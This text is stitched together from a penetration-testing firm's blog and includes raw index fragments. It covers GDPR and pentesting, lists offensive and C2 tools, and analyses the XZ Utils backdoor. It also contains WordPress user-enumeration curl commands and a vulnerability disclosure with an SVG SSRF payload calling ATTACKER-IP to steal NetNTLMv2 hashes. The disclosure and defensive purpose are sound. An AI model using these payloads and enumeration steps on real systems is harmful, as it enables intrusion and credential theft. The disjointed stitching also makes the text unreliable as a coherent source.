Indeed, it has been at the heart of digital concerns for businesses for several years üõ°Ô∏è. The General Data Protection Regulation (GDPR) imposes strict standards regarding the protection of personal data within the European Union. Since its implementation in May 2018, companies have had to take rigorous measures to secure the data they collect and process. Among these measures, penetration testing proves to be an essential tool for ensuring GDPR compliance. But in what way? ü§î The main risk is obviously the financial penalties that can go up to 20 million euros. But don‚Äôt panic!

Before going any further, it is interesting to concretely define the term penetration test. A penetration test, also colloquially called ‚Äúpentest‚Äù, is a simulation of an attack on an IT system carried out by security experts (like Trackflaw, for example üë§). The goal is to identify vulnerabilities that could be exploited by cybercriminals to access, in particular, sensitive data (sensitive data, GDPR, that should ring a bell üí°). Penetration tests can be conducted on different aspects of an infrastructure, such as internal systems, web applications, or even mobile devices.

The first is that GDPR requires companies to ensure the confidentiality and security of personal data. According to Article 32 of the regulation, companies must implement appropriate technical and organizational measures to ensure a level of security appropriate to the risk. This includes, among other things, measures to protect data against destruction, loss, alteration, disclosure, or unauthorized access. And this is where penetration testing comes in. üïµÔ∏è By identifying security flaws before they are exploited, penetration tests allow companies to take proactive corrective measures. This not only helps to strengthen overall security but also demonstrates that the company takes its obligations seriously regarding data protection, a crucial aspect in the event of an audit or compliance check by the authorities.

Implementing GDPR policies is expensive, and many companies would gladly avoid it üòÇ So, the government has an infallible technique to motivate compliance: fines üí∞ But then, how can a penetration test help you avoid GDPR-related fines? It is worth noting that fines for non-compliance with GDPR can be very severe, up to 20 million euros or 4% of annual global turnover, whichever is higher. One of the main causes of these fines is the lack of adequate security measures to protect personal data. A regular penetration test ensures that the security measures in place are effective and compliant with GDPR requirements. In the event of a data breach, being able to demonstrate that the company has conducted penetration tests and addressed identified vulnerabilities can work in its favor. This can not only reduce the impact of a potential fine but also preserve the company‚Äôs reputation.

Reconnaissance tools Reconnaissance and service mapping is the first step in a web penetration test. It involves collecting information about the target, such as accessible services, accessible technologies, etc. Reconnaissance tools help pentesters gather valuable data that can be directly or indirectly useful for the penetration test. Some examples of tools: Nmap: nmap is the network scanner par excellence, it allows identifying active hosts on a network, available services, and running software versions. Nmap is extremely flexible and can be used for complete reconnaissance of a particular target. Subfinder: subfinder is a passive subdomain discovery tool, optimized for speed and lightness. It uses passive sources to identify valid subdomains of a website. GitHub. Gau (GetAllUrls): gau quickly retrieves all possible URLs for a given domain from various sources such as Wayback Machine and Common Crawl. We use it to enhance our perimeter view. GitHub. TheHarvester: theHarvester is an information-gathering tool that retrieves emails, names, subdomains, IP addresses, and banners from public sources such as search engines and PGP databases. Truly excellent! GitHub. Wafw00f: wafw00f detects and identifies web application firewalls (WAF) by sending HTTP requests and analyzing the responses to determine the security countermeasures deployed by the target site.

Exploitation tools Once vulnerabilities are identified, exploitation tools allow verification of whether these flaws can be exploited to gain unauthorized access. Caution When Using Be cautious when using these tools! They can cause significant damage and service disruptions if misused. Always research the tool‚Äôs consequences before executing it on your target! Some examples of the most well-known tools: Metasploit: Metasploit is a modular penetration testing framework that allows for developing, testing, and executing exploits. It is widely used for detecting and exploiting vulnerabilities. GitHub. SQLMap: SQLMap is an automated SQL injection tool that allows testing and exploiting SQL injections in web applications. It supports various databases and provides features for data extraction, bypassing WAFs, and more. GitHub. SSRFmap: SSRFmap is a tool for exploiting Server-Side Request Forgery (SSRF) vulnerabilities, helping find and exploit SSRF vulnerabilities by automating attacks and providing advanced data exfiltration features. GitHub. NoSQLMap: NoSQLMap is a tool used to test and exploit NoSQL databases. It supports several types of NoSQL databases and offers features for NoSQL injections, detection of injections, and other attacks specific to NoSQL databases. GitHub. SearchSploit: SearchSploit is a command-line utility for searching exploits in the Exploit-DB database. It allows pentesters to quickly access public exploits without needing a constant internet connection. GitHub. Our Favorite Exploitation Tools at Trackflaw Here are the 3 must-have tools for effectively exploiting vulnerabilities: Metasploit: A true historical toolbox in the field of security, this framework allows for all kinds of offensive actions, from scanning to post-exploitation, making it indispensable for any offensive engagement.

Post-exploitation Tools Finally, post-exploitation tools are used after gaining initial access to maintain persistent access and further explore the compromised system. Caution (Again!) When Using Like the previous tools, post-exploitation tools can cause significant damage if not mastered. They can also greatly degrade the initial security level of the target. It is therefore strongly advised to obtain the commander‚Äôs authorization before any use! A small non-exhaustive list: Weevely: Weevely is a web shell designed for post-exploitation. It offers over 30 modules to assist with administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread within the target network. GitHub. Cobalt Strike: Cobalt Strike is a commercial post-exploitation tool used to assess the resilience of systems against advanced persistent threats (APT). It allows for simulating real attacks, controlling compromised systems, and conducting reconnaissance and exploitation activities. Official site. Sliver: Sliver is an open-source command and control (C2) framework. It offers a variety of features for executing commands, managing sessions, and handling payloads. GitHub. Havoc: Havoc is a modern red teaming and post-exploitation framework allowing simulation of advanced attacks against networks and systems. It offers an intuitive user interface and easy integration with various security tools. GitHub. Mythic: Mythic is a flexible and extensible C2 framework used for penetration testing and red teaming operations. It allows managing multiple agents, creating custom payloads, and controlling compromised systems via a web interface. GitHub. Our Favorite Post-Exploitation Tools at Trackflaw Here are our 3 favorite tools during our post-exploitation steps: Weevely: Greatly facilitates managing web shells on PHP applications. Unfortunately, it does not work on other languages (the kraken tool might be a new alternative). Sliver: Very functional, free, and practical C2. To be used in addition to Mythic. Mythic: Same as Sliver. To be used in addition to Sliver. Cobalt Strike or Not? Cobalt Strike is probably the most well-known and widespread C2 system among Red Teamers but also among attackers. Although it is a very effective product, it is difficult to obtain legally, and its license is very expensive (around ‚Ç¨3,500). We do not recommend its use outside of a commercial Red Team activity.

Perfect, let‚Äôs continue! Otherwise, feel free to make an appointment with us to discuss it! üìû Below is a list (not exhaustive) of criteria to consider. These are the most common: Scope of the test The scope of the test is one of the main factors influencing the cost. The more vast and complex the system to be tested, the more expensive the test will be. For example, testing a small institutional website in black box will not cost as much as performing a penetration test on a complex internal network containing numerous servers and machines. Type of test The cost will also vary depending on the type of penetration test chosen: black box, gray box, or white box. Black box tests are often less expensive because they require less access to internal systems or the web application, while white box tests require full access and are therefore more costly to perform. Complexity of the IT systems Systems using advanced or obsolete technologies may require specialized skills increasing the cost of the test (for example: industrial systems). Moreover, custom or unusual configurations often require additional efforts to perform an effective test. But don‚Äôt worry, the impact is often quite manageable on the price üòä Experience and qualifications of the auditors The expertise and qualifications of the security consultants performing the tests can also affect the cost. An experienced and certified auditor will necessarily be more demanding in terms of salary than a junior auditor. Certifications such as OSCP, eWPT, or those issued by ANSSI (PASSI) can indicate a higher level of competence, which can influence the daily rate of the provider.

This code, absent from the public repository of the project, was added only in the compressed source code versions available for download by users on GitHub. The operation of the backdoor is highly complex and relies on several techniques to evade detection. Notably, it uses specific compiler functions, hidden files, and scripts executed during the compilation of the XZ Utils library. üéØ Its ultimate goal is to replace a function of the SSH library, allowing attackers to connect to the system without authentication and execute any command.

The malicious code then examines the public RSA module (modulo n) transmitted in the RSA structure (4th argument of RSA_public_decrypt). This value is communicated by the attacker during SSH authentication. The backdoor decrypts and verifies the signature using a public ED448 key (below) 0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28 34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48 10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e 20 d3 2c 60 2b 2c 6d 31 00 Only the attacker possesses the private key linked to this public key.

Reconnaissance The auditor starts by collecting basic information: Determine the WordPress version, plugins, and themes used. Identify the technologies and frameworks used (JavaScript, PHP, etc.). Analyze HTTP headers for possible sensitive information. For example, to verify if a website runs on WordPress: curl https://victim.com/ | grep 'content=\"WordPress' For example, to check if a website is running on WordPress: Or else, you can also use the excellent Wappalyzer extension as shown in the screenshot below (the WordPress in the capture is not very secure, by the way‚Ä¶)! üòÄ Subsequently, the pentester may attempt to retrieve files: Try to download potentially sensitive files, for example, those freely accessible in the wp-contents directory. Look for backup files or unprotected configuration files. A small example to obtain the list of plugins and themes (when possible) Plugins curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://vuln.trackflaw.com/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2 Th√®mes curl -s -X GET https://vuln.trackflaw.com/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2 Finally, the auditor enumerates users: Identify existing users and roles on the site. Attempt to guess usernames and passwords through brute force or dictionary attacks. Several methods to perform this action: By brute-forcing credentials: curl -s -I -X GET http://vuln.trackflaw.com/?author=1. Via the wp-json route: curl http://vuln.trackflaw.com/wp-json/wp/v2/users. Through enumeration on the wp-login.php page. Exploitation Subsequently, the auditor is tasked with studying vulnerabilities impacting the site, its plugins, and its themes. Some examples of vulnerabilities: SQL Injection Tests: Exploit security flaws in plugins or themes to inject malicious SQL code. Cross-Site Scripting (XSS): Inject malicious JavaScript code into the site to redirect users. Cross-Site Request Forgery (CSRF): Force an authenticated user to perform unwanted actions.

The vulnerabilities in this article may only be applicable in a specific context. Description The Therefore application is too permissive regarding the type of file that can be uploaded by a user. Indeed, it only prevents the uploading of HTML, EXE, and BAK files. An attacker can upload technical files such as PHP, ASP, ASPX, and JSP files. These files could allow, under certain conditions, the execution of system commands (not exploitable here). The image below summarizes the different extensions that can be used in the application (generated with the intruder function of Burp Suite Pro). Exploitation The application prevents HTML files from being uploaded. This protection can be easily bypassed by uploading markdown (MD) files that support HTML. It‚Äôs important to note that it is not possible to upload executable files such as malware. This lack of control over the uploaded content facilitates the exploitation of the following vulnerability. Risks An attacker is able to upload files not controlled by the application. This allows an attacker to more easily exploit SSRF vulnerabilities, upload malicious files (other than exe type), or trigger denial-of-service attacks. An attacker could also, under certain conditions, execute code through the uploaded files (ASP, PHP, JSP files, etc). Mitigation It is advised to limit the type of files to upload to the strictly necessary. A standard user most of the time needs only text processing files (e.g., office and PDF files) and images. It is recommended to limit the number of usable extensions (refer to the extensions managed by the Aspose plugin developer).

Using this type of solution allows the conversion of a large number of different files (more info in Aspose‚Äôs documentation). This presents a risk if the application does not properly manage the filtering of unused extensions. According to the software developer Aspose, security measures should be in place to prevent an attacker from making the server execute internal requests. This attack is called SSRF (Server Side Request Forgery). The solution provided by Therefore is vulnerable to SSRF attacks in several ways. Exploitation Access to a Remote Resource The use of an SVG file illustrates the possibility of making an HTTP GET request by the application to a server controlled by the attacker. The screenshot above illustrates this SSRF vulnerability using an SVG file (available below). \u003csvg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u003e \u003cimage xlink:href=\"http://ATTACKER-IP\"\u003e \u003c/svg\u003e Password hash retrieval In a Windows environment, it is possible to request a resource through a specific path. This functionality can be coupled with this SSRF weakness to redirect the local account of the machine hosting the application to the attacker‚Äôs SMB server. The latter will receive the NetNTLMv2 hash of this service account. In the screenshot below, an SMB server was deployed on the attacker‚Äôs machine. By interpreting the SVG file, the attacker‚Äôs server collects the digest of the machine account FR********4$. This digest could then be relayed and/or cracked to attack the initial client‚Äôs Active Directory environment. Internal network mapping This SSRF vulnerability also allows an attacker to map the internal architecture of the client (if it communicates with the Internet). In the screenshot below, it is possible to reach the server google.fr. The attacker could also use the victim machine as a proxy to impersonate its public IP address. Finally, an attacker is also able to perform the following actions (not conclusive due to lack of time): Port Scanning: it is possible to scan the ports of machines on the network. File Reading: the Aspose plugin seems to be protected against file reading (e.g., the screenshot below. The service redirects to loading the file C:\\Windows\\win.ini but nothing is displayed). Denial of Service: an attacker is able to upload a document referring to very large images. When processing this image, the library consumes memory and time to process these images. Risks The main risks of this vulnerability for clients using this solution are: Credential Theft: an attacker is able to collect the NetNTLMv2 digest of a person uploading remote content. This type of challenge can be cracked by the attacker to retrieve the target user‚Äôs password. Disclosure of Sensitive Images: processing a document containing a reference to a local image file will result in the disclosure of this file in the final document. This can lead to the disclosure of sensitive information. Mapping the Victim‚Äôs Information System: an attacker can map the victim‚Äôs infrastructure and perform service discovery. Denial of Service: an attacker can prevent the machine from functioning properly by rendering it unusable. Mitigation To mitigate this SSRF vulnerability, it is possible to modify the configuration of the Aspose plugin used in the file analysis function. The plugin is able to prevent SSRF attacks. Aspose has already published an article warning about the various risks associated with loading remote elements. The following code example shows how to disable the loading of external images: public class DisableExternalImagesHandler : IResourceLoadingCallback { public ResourceLoadingAction ResourceLoading(ResourceLoadingArgs args) { // Skip external images loading. return (arg","date":"02/02/2024","objectID":"/en/multinational-hacking-with-file-upload-and-ssrf/:4:2","tags":["Penetration Testing","Pentest","CVE"],"title":"How to Hack a 20 billion euro multinational corporation (legally)?","uri":"/en/multinational-hacking-with-file-upload-and-ssrf/"},{"categories":null,"content":"Going further !
